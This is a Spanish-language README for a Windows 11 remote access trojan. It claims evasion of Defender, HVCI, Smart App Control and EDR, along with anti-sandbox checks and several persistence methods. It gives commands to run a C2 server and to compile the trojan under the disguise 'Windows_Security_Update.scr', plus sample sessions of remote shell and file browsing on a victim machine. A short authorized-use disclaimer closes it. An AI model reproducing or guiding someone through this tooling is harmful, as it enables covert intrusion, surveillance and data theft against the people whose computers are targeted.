markdown
# 🕵️‍♂️ Advanced Windows 11 RAT - Documentación Completa

## 📖 ÍNDICE
- [Descripción General](#-descripción-general)
- [Características Técnicas](#-características-técnicas)
- [Requisitos del Sistema](#-requisitos-del-sistema)
- [Instalación y Configuración](#-instalación-y-configuración)
- [Uso del Sistema](#-uso-del-sistema)
- [Funcionalidades Detalladas](#-funcionalidades-detalladas)
- [Consideraciones de Seguridad](#-consideraciones-de-seguridad)
- [Solución de Problemas](#-solución-de-problemas)

---

## 🎯 DESCRIPCIÓN GENERAL

**Advanced Windows 11 RAT** es una herramienta de administración remota avanzada diseñada específicamente para evadir las defensas de seguridad de Windows 11. Desarrollada para **pruebas de penetración autorizadas** y **investigación de seguridad**, implementa técnicas cutting-edge de evasión y ofuscación.

### ⚡ ¿Qué hace este RAT?
- ✅ **Control remoto completo** de sistemas Windows 11
- ✅ **Evación avanzada** de defensas nativas de Windows
- ✅ **Comunicación cifrada** con servidor C2
- ✅ **Persistencia múltiple** en el sistema objetivo
- ✅ **Recolección de inteligencia** automatizada

---

## 🔧 CARACTERÍSTICAS TÉCNICAS

### 🛡️ Módulos de Evasión
| Módulo | Tecnología | Efectividad |
|--------|------------|-------------|
| **Bypass HVCI** | Memory Mapping Indirecto | ⭐⭐⭐⭐⭐ |
| **Bypass Defender ML** | Comportamiento Mimético | ⭐⭐⭐⭐ |
| **Bypass Smart App Control** | Simulación de Firmas | ⭐⭐⭐⭐ |
| **Bypass EDR** | Syscalls Directos | ⭐⭐⭐ |
| **Anti-Sandbox** | Múltiples Técnicas | ⭐⭐⭐⭐⭐ |

### 🔐 Cifrado y Ofuscación
- **Cifrado Polimórfico**: XOR + ROT dinámico
- **Claves Runtime**: Generación en tiempo de ejecución
- **Strings Ofuscados**: Sin texto claro en binario
- **Comunicación Cifrada**: End-to-end encryption

---

## ⚙️ REQUISITOS DEL SISTEMA

### 🐧 Servidor C2 (Kali Linux)
```bash
# Sistema Operativo
- Kali Linux 2023+ o distribución Linux similar
- Python 3.8+
- Acceso root para puertos privilegiados

# Dependencias
python3 -c "import sys; assert sys.version_info >= (3, 8)"
pip3 install cryptography
🪟 Cliente RAT (Windows)
bash
# Sistema Operativo
- Windows 11 (todas versiones)
- Visual Studio 2022 Build Tools
- Windows SDK 10.0.19041+

# Librerías Requeridas
- ws2_32.lib (Winsock2)
- crypt32.lib (CryptoAPI)
- ntdll.lib (Syscalls nativos)
- bcrypt.lib (Cifrado avanzado)
🚀 INSTALACIÓN Y CONFIGURACIÓN
Paso 1: Configurar Servidor C2 (Kali)
bash
# 1. Actualizar sistema e instalar dependencias
sudo apt update && sudo apt upgrade -y
sudo apt install python3-pip git -y

# 2. Instalar librerías de criptografía
pip3 install cryptography

# 3. Clonar y configurar el proyecto
git clone https://github.com/tu-repo/advanced-win11-rat.git
cd advanced-win11-rat

# 4. Configurar IP del servidor (EDITAR ANTES DE USAR)
nano config.py
# Modificar: C2_IP = "192.168.1.100"  # Tu IP de Kali

# 5. Ejecutar servidor C2
sudo python3 c2_server.py
Paso 2: Compilar el RAT (Windows)
bash
# 1. Abrir Developer Command Prompt de VS 2022
# Buscar en inicio: "Developer Command Prompt"

# 2. Navegar al directorio del proyecto
cd C:\ruta\al\proyecto

# 3. Compilar el troyano con ofuscación
cl.exe /Fe:"Windows_Security_Update.scr" /std:c++latest /O2 /GL /Gy /GS- /GR- /EHa /Zl troyano_w11.cpp ws2_32.lib crypt32.lib bcrypt.lib ntdll.lib

# 4. Verificar compilación exitosa
dir Windows_Security_Update.scr
Paso 3: Configurar Red y Puertos
bash
# En el router/firewall, permitir:
- Puerto TCP 443 (HTTPS) entrante en Kali
- IP estática para el servidor Kali

# Verificar conectividad desde Windows:
telnet 192.168.1.100 443  # Reemplazar con IP de Kali
🎮 USO DEL SISTEMA
Iniciar Sesión C2
bash
# En Kali Linux:
sudo python3 c2_server.py

# Salida esperada:
[+] C2 Server started on 0.0.0.0:443
[+] Waiting for connections...
[+] New connection from ('192.168.1.50', 65432)
Comandos Disponibles
Comando	Descripción	Ejemplo
SHELL	Terminal remota interactiva	SHELL
INFO	Información completa del sistema	INFO
FILES	Listar archivos del directorio	FILES
PWD	Directorio actual de trabajo	PWD
IDLE	Comando de verificación	IDLE
Ejemplos de Uso
1. Obtener Información del Sistema
bash
[💻 C2@192.168.1.50]> INFO

[📨 RESPONSE]:
=== SYSTEM INFORMATION ===
OS: Windows 10.0
Build: 22621
Computer: DESKTOP-ABC123
User: john.doe
RAM: 16 GB
2. Ejecutar Comandos Remotos
bash
[💻 C2@192.168.1.50]> SHELL

[📨 RESPONSE]:
[🖥️ SHELL OUTPUT]:
usuario_empresa\john.doe
DESKTOP-ABC123

Configuración IP de Windows...

Adaptador de Ethernet Ethernet0:
   Dirección IPv4. . . . . . . . . . . . . . : 192.168.1.50
   Máscara de subred . . . . . . . . . . . . : 255.255.255.0
3. Explorar Sistema de Archivos
bash
[💻 C2@192.168.1.50]> FILES

[📨 RESPONSE]:
=== CURRENT DIRECTORY FILES ===
[DIR] .
[DIR] ..
[FILE] document.txt
[FILE] secret_data.xlsx
[DIR] Confidential
🔧 FUNCIONALIDADES DETALLADAS
🛡️ Módulo de Evasión Avanzada
cpp
// Técnicas implementadas:
- Memory Mapping Indirecto (bypass HVCI)
- Timing Attacks anti-sandbox
- Fragmentación de ejecución
- Simulación de comportamiento legítimo
- Syscalls directos (bypass EDR hooks)
🔐 Sistema de Cifrado
python
# Algoritmo compatible cliente-servidor
def encrypt_data(data):
    # ROTL + XOR con clave dinámica
    # Compatible total con implementación C++
📡 Comunicaciones Sigilosas
cpp
// Características de red:
- Puerto 443 (tráfico HTTPS legítimo)
- Backoff exponencial en reconexión
- Ofuscación de patrones de tráfico
- Timeouts variables anti-detección
💾 Mecanismos de Persistencia
cpp
// Múltiples métodos implementados:
- Registry Run Keys (HKCU\...\Run)
- Scheduled Tasks (Tareas programadas)
- Startup Folder (Acceso directo)
- WMI Event Subscriptions
⚠️ CONSIDERACIONES DE SEGURIDAD
🎯 USO ÉTICO AUTORIZADO
text
✅ PERMITIDO EN:
- Pruebas de penetración con consentimiento
- Laboratorios de seguridad educativos
- Investigación académica supervisada
- Entornos controlados autorizados

❌ PROHIBIDO ABSOLUTAMENTE:
- Acceso no autorizado a sistemas
- Actividades delictivas o maliciosas
- Robo de información o datos
- Daño a sistemas o redes
🔒 MEDIDAS DE SEGURIDAD IMPLEMENTADAS
bash
# En el código:
- Verificación de entorno (anti-sandbox)
- Detección de herramientas de análisis
- Comprobación de recursos del sistema
- Múltiples capas de ofuscación
📝 COMPLIANCE LEGAL
text
⚠️ ADVERTENCIA LEGAL:
El uso de esta herramienta sin autorización explícita
constituye un delito en la mayoría de jurisdicciones.

Siempre obtener:
- Consentimiento por escrito del propietario del sistema
- Autorización de la organización objetivo
- Cumplimiento de leyes locales e internacionales
- Documentación completa de las pruebas realizadas
